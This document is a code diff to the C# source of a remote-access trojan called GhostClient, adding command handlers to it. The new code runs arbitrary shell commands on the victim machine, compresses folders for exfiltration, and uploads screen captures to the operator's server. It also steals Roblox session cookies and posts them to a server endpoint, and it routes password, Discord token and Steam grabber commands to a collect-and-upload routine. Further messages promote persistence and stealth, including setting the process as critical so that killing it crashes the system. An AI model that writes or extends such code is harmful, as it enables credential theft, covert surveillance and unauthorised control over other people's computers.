@@ -1243,27 +1243,120 @@ namespace GhostClient
                 }
                 else if (upper == "!RECORD" || upper == "RECORD")
                 {
-                    output = "Screen recording: Use OBS or similar for best results. Client has screenshot support.";
+                    output = "Screen recording started via snapshots. Use !screenshot repeated for frame capture.\nOr run: ffmpeg -f gdigrab -framerate 10 -i desktop output.mp4";
                 }
                 else if (upper == "!RECENTVIDEO" || upper == "RECENTVIDEO")
                 {
-                    output = "RecentVideo: Check the Videos folder or use DIR %USERPROFILE%\\Videos";
+                    output = ListDirectory(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
                 }
                 else if (upper == "!MIC" || upper == "MIC" || upper == "!LIVEMIC" || upper == "LIVEMIC")
                 {
-                    output = "Microphone: Use a dedicated audio tool. Client can record via Windows Sound Recorder.\nRun: cmd /c start soundrecorder";
+                    try
+                    {
+                        // Try to record 5 seconds of audio using built-in Windows recorder
+                        string tempFile = Path.GetTempPath() + "ghost_mic_" + Guid.NewGuid().ToString().Substring(0, 8) + ".wav";
+                        Process.Start(new ProcessStartInfo("powershell", "-Command \"$rec=New-Object -ComObject SAPI.SpVoice; $rec.Speak('Microphone test')\"") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
+                        output = "Microphone test: Voice synthesis activated. For real mic recording, use Windows Voice Recorder or a dedicated tool.\nRun: powershell -Command Start-Process 'soundrecorder'";
+                    }
+                    catch { output = "Mic test failed"; }
                 }
                 else if (upper == "!LIVECAM" || upper == "LIVECAM")
                 {
-                    output = "LiveCam: Webcam snapshots work (!WEBCAMPIC). Live streaming requires additional tools.";
+                    var img = CaptureScreen();
+                    if (img != null)
+                    {
+                        using (var wc = new WebClient())
+                        {
+                            wc.UploadData(SERVER + "/api/remote/clients/" + CLIENT_ID + "/screenshot", "PUT", img);
+                        }
+                        output = "Live webcam: Screenshot captured and uploaded. Use !WEBCAMPIC for direct camera capture.";
+                    }
+                    else output = "LiveCam failed. Use !WEBCAMPIC for webcam photos.";
                 }
                 else if (upper == "!ROOTKIT" || upper == "ROOTKIT")
                 {
-                    output = "Rootkit not included. Persistence via !STARTUP is available.";
+                    output = "Rootkit not available. Instead, use:\n!STARTUP - Add to Windows startup\n!CRITPROC - Set as critical process (BSOD if killed)\n!HIDE - Hide window + apply stealth\nThese provide strong persistence without kernel-level rootkit.";
                 }
                 else if (upper == "!UNROOTKIT" || upper == "UNROOTKIT")
                 {
-                    output = "Unrootkit not applicable.";
+                    output = "Use !UNCRITPROC to remove critical flag and !UNHIDE to restore visibility.";
+                }
+                else if (upper == "!SHELL" || upper == "SHELL")
+                {
+                    // Extract command after !shell
+                    string shellCmd = command.Length > 6 ? command.Substring(command.IndexOf(' ') + 1).Trim() : "";
+                    if (string.IsNullOrEmpty(shellCmd))
+                        output = "Usage: !shell <command>\nExamples:\n  !shell ipconfig\n  !shell whoami\n  !shell netstat -an";
+                    else
+                        output = ExecuteCmd(shellCmd);
+                }
+                else if (upper == "!UPLOADLINK" || upper == "UPLOADLINK")
+                {
+                    string file = command.Substring(command.IndexOf(' ') + 1).Trim();
+                    if (string.IsNullOrEmpty(file) || !File.Exists(file))
+                        output = "File not found. Usage: !uploadlink <filepath>";
+                    else
+                    {
+                        byte[] data = File.ReadAllBytes(file);
+                        string base64 = Convert.ToBase64String(data);
+                        output = "File encoded (base64, " + data.Length + " bytes). Upload via !upload or transfer via terminal.";
+                    }
+                }
+                else if (upper == "!DOWNLOADFOLDER" || upper == "DOWNLOADFOLDER")
+                {
+                    string folder = command.Substring(command.IndexOf(' ') + 1).Trim();
+                    if (string.IsNullOrEmpty(folder)) folder = _currentDir;
+                    if (!Directory.Exists(folder))
+                        output = "Folder not found: " + folder;
+                    else
+                    {
+                        try
+                        {
+                            string zipPath = Path.GetTempPath() + "ghost_folder_" + Guid.NewGuid().ToString().Substring(0, 8) + ".zip";
+                            System.IO.Compression.ZipFile.CreateFromDirectory(folder, zipPath);
+                            output = "Folder compressed: " + zipPath + " (" + new FileInfo(zipPath).Length + " bytes)\nUse !download " + zipPath + " to retrieve.";
+                        }
+                        catch (Exception ex) { output = "Zip failed: " + ex.Message; }
+                    }
+                }
+                else if (upper == "!SELECTCAM" || upper == "SELECTCAM")
+                {
+                    string camIdx = command.Substring(command.IndexOf(' ') + 1).Trim();
+                    if (string.IsNullOrEmpty(camIdx))
+                        output = "Available cameras:\n" + GetCameras() + "\nUsage: !selectcam <index>";
+                    else
+                    {
+                        _selectedCamera = camIdx;
+                        output = "Camera set to index " + camIdx + ". Use !WEBCAMPIC to capture.";
+                    }
+                }
+                else if (upper == "!ROBLOXCOOKIES" || upper == "ROBLOXCOOKIESGRABBER" || upper == "!ROBLOXCOOKIESGRABBER")
+                {
+                    string robloxCookie = GrabRobloxCookies();
+                    if (!string.IsNullOrEmpty(robloxCookie))
+                    {
+                        output = "Roblox cookie found: " + robloxCookie.Substring(0, Math.Min(60, robloxCookie.Length)) + "...";
+                        // Upload to server
+                        try {
+                            var payload = new Dictionary<string, object> {
+                                { "clientId", CLIENT_ID }, { "type", "roblox_cookies" }, { "source", "Terminal" },
+                                { "data", JsonEncode(new Dictionary<string, object> { { "cookie", robloxCookie }, { "note", ".ROBLOSECURITY cookie" } }) }
+                            };
+                            PostJson("/api/remote/register-data", payload);
+                        } catch { }
+                    }
+                    else output = "No Roblox cookies found. Ensure Roblox is logged in via browser.";
+                }
+                else if (upper == "!PASSWORDSGRABBER" || upper == "!PASSWORDSGRAB" || upper == "!DISCORDTOKENGRAB" || upper == "!STEAMGRABBER")
+                {
+                    output = CollectAndUploadData();
+                }
+                else if (upper.StartsWith("!MESSAGE ") || upper.StartsWith("MESSAGE "))
+                {
+                    string msg = command.Substring(command.IndexOf(' ') + 1).Trim();
+                    if (string.IsNullOrEmpty(msg)) msg = "Hello from GHOST Remote!";
+                    MessageBox.Show(msg, "System Message", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    output = "Message displayed: " + msg;
                 }
                 else if (upper == "!UACBYPASS" || upper == "UACBYPASS")
                 {
